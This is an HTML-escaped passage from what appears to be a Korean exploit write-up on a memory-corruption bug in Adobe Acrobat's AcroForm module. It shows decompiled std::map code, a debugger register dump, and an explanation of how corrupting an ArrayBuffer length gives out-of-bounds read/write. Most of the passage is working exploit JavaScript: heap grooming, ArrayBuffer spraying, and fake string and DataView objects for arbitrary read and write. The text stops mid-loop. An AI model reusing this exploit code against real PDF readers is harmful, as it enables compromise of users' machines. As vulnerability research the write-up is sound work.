      Throw_tree_length_error();
    ...
    *(_DWORD *)a2 = &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::insert(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, v8[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;], (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v8[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;], Parent);
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xC5B4; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;(&lt;code&gt;a2&lt;/code&gt;)&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD55C; &lt;code&gt;v8&lt;/code&gt;&amp;#xC5D0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC501;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;std-map-lower-bound&#34;&gt;&lt;a href=&#34;#std-map-lower-bound&#34; class=&#34;headerlink&#34; title=&#34;std::map::lower_bound&#34;&gt;&lt;/a&gt;std::map&lt;unsigned short,cagg&gt;::lower_bound&lt;/unsigned&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;_DWORD *__thiscall &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::lower_bound(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a3)
{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Myhead; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Parent; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 v5; &lt;span class=&#34;hljs-comment&#34;&gt;// si&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v6; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// TREE_VAL *this&lt;/span&gt;
  Myhead = *(_DWORD *)&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;;                     &lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;_Myhead;&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;//    mov     eax,dword ptr [ecx]  ds:002b:20000058=20000060&lt;/span&gt;
  Parent = *(_DWORD *)(*(_DWORD *)&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);    &lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;_Myhead-&amp;gt;_Parent&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;//    mov     ecx,dword ptr [eax+4] ds:002b:20000064=20000044&lt;/span&gt;
  a2[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  *a2 = Parent;
  a2[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = Myhead;
  ...
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; a2;                                    
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Myhead&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;this&lt;/code&gt;(0x20000058)&amp;#xC5D0;&amp;#xC11C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4; 0x20000060&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xACE0; &lt;code&gt;Myhead-&amp;gt;_Parent&lt;/code&gt;(0x20000064)&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; 0x20000044&amp;#xAC00; &lt;code&gt;Parent&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC758; &amp;#xD638;&amp;#xCD9C; &amp;#xACB0;&amp;#xACFC; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD55C; &lt;code&gt;v8&lt;/code&gt;&amp;#xC758; 0, 1, 2 &amp;#xC778;&amp;#xB371;&amp;#xC2A4;&amp;#xC5D0; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;Parent&lt;/code&gt;(0x20000044), 0, &lt;code&gt;Myhead&lt;/code&gt;(0x20000060) &amp;#xAC12;&amp;#xC774; &amp;#xC4F0;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;std-map-insert&#34;&gt;&lt;a href=&#34;#std-map-insert&#34; class=&#34;headerlink&#34; title=&#34;std::map::insert&#34;&gt;&lt;/a&gt;std::map&lt;unsigned short,cagg&gt;::insert&lt;/unsigned&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::insert(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a3, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a4)
{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *Myhead; &lt;span class=&#34;hljs-comment&#34;&gt;// ebx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *v5; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *v6; &lt;span class=&#34;hljs-comment&#34;&gt;// edi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v8; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *v9; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v10; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;

  ++&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];                                    &lt;span class=&#34;hljs-comment&#34;&gt;// ++this-&amp;gt;_Mysize;&lt;/span&gt;
  Myhead = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)*&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;;                        &lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;_Myhead&lt;/span&gt;
  v5 = a4;
  a4[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a2;                              &lt;span class=&#34;hljs-comment&#34;&gt;// a4-&amp;gt;_Parent = a2&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a2 != Myhead )
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a3 )&lt;span class=&#34;hljs-comment&#34;&gt;// a3 == 0&lt;/span&gt;
    {
      ...
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
	    a2[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a4;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a2 == (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)Myhead[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] )
        Myhead[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a4;
    }
    ...
  }
  ...
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;(&lt;code&gt;a2&lt;/code&gt;)&amp;#xB294; &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;v8[0]&lt;/code&gt;&amp;#xC5D0; &amp;#xC4F0;&amp;#xC778; &lt;code&gt;Parent&lt;/code&gt;(0x20000044)&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&amp;#xC138; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;(&lt;code&gt;a3&lt;/code&gt;)&amp;#xC740;  &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC4F0;&amp;#xC778; 0&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;else&lt;/code&gt;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &lt;code&gt;a2[2] = (int)a4;&lt;/code&gt;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &lt;code&gt;Parent + 8&lt;/code&gt;(0x2000004c)&amp;#xC5D0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC4F0;&amp;#xC774;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000044 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=20000060 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=20000058 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=291a1bf8 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=291a1bf8 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=20000058
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=6385bccf &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457ab88 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457ab94 &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe nc
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200246
AcroForm!hb_set_invert+0x3d1f:
6385bccf 897008          mov     dword ptr [eax+8],esi ds:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;2000004c&lt;/span&gt;=0000ffe8&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Parent + 8&lt;/code&gt;&amp;#xC740; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; length&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xACE0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB294; &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC6D0;&amp;#xB798;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xC778; 0xffe8&amp;#xBCF4;&amp;#xB2E4; &amp;#xD6E8;&amp;#xC52C; &amp;#xD07D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; OOB Read/Write&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Javascript-code&#34;&gt;&lt;a href=&#34;#Javascript-code&#34; class=&#34;headerlink&#34; title=&#34;Javascript code&#34;&gt;&lt;/a&gt;Javascript code&lt;/h3&gt;&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &amp;#xC704; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xC5EC; OOB Read/Write&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xB294; Javascript &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/*&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;....&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;*/&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ALLOC_SIZE = &lt;span class=&#34;hljs-number&#34;&gt;0x10000&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ARR_BUF_BASE = &lt;span class=&#34;hljs-number&#34;&gt;0x20000048&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ARR_BUF_MALLOC_BASE = &lt;span class=&#34;hljs-number&#34;&gt;0x20000040&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; arrBufPtr = ARR_BUF_BASE + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_STR_START = &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_STR = arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_DV_START = &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_DV = arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x180&lt;/span&gt;;
&lt;span class=&#34;hljs-comment&#34;&gt;/*&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;....&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;*/&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;groomLFH&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;size, count&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; code =
        &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%u4141%u4242%u4343%u4444%u4545%u4646%u4747%u4848%u4949%u4a4a%u4b4b%u4c4c%u4d4d%u4e4e%u4f4f%u5050%u0058%u2000%u5353%u5454%u5555%u5656%u5757%u5858%u5959%u5a5a%u5b5b%u5c5c%u5d5d%u5e5e%u5f5f%u6060%u6161%u6262%u6363%u6464%u6565%u6666%u6767%u6868%u6969%u6a6a%u6b6b%u6c6c%u6d6d%u6e6e%u6f6f%u7070%u7171%u7272%u7373%u7474%u7575%u7676%u7777%u7878%u7979%u7a7a%u7b7b%u7c7c%u7d7d%u7e7e%u7f7f%u8080%u8181%u8282%u8383%u8484&amp;quot;&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; string = &lt;span class=&#34;hljs-built_in&#34;&gt;unescape&lt;/span&gt;(code);

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; count; i++) {
        chunks.push(string.substr(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, (size - &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) / &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;).toUpperCase());
    }

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; chunks.length; i += &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) {
        chunks[i] = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;delete&lt;/span&gt; chunks[i];
    }
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;sprayArrBuffers&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x1500&lt;/span&gt;; i++) {
        bufs[i] = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(ALLOC_SIZE);
        &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; uintArr = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint32Array&lt;/span&gt;(bufs[i]);
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; k = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; k &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;; k++) {
            uintArr[k] = &lt;span class=&#34;hljs-number&#34;&gt;0x33333333&lt;/span&gt;;
        }
        uintArr[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;//first deref a = *ecx&lt;/span&gt;
        uintArr[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x41424344&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;//map size&lt;/span&gt;
        uintArr[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x41424344&lt;/span&gt;;
        uintArr[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = ARR_BUF_BASE - &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;

        &lt;span class=&#34;hljs-comment&#34;&gt;// fake string for arbitrary read&lt;/span&gt;
        uintArr[FAKE_STR_START] = &lt;span class=&#34;hljs-number&#34;&gt;0x102&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;//type&lt;/span&gt;
        uintArr[FAKE_STR_START + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// buffer&lt;/span&gt;
        uintArr[FAKE_STR_START + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;;
        uintArr[FAKE_STR_START + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;;

        &lt;span class=&#34;hljs-comment&#34;&gt;// fake dataview for arbitrary write&lt;/span&gt;
        uintArr[FAKE_DV_START] = &lt;span class=&#34;hljs-number&#34;&gt;0x77777777&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;delete&lt;/span&gt; uintArr;
        uintArr = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;
    }

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;; i++) {
        arrs[i] = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;);
        arrs[i][&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x47484950&lt;/span&gt;;
        arrs[i][&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = targetStr;
        arrs[i][&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = targetDV;
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; k = &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;; k &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;5000&lt;/span&gt;; k++) {
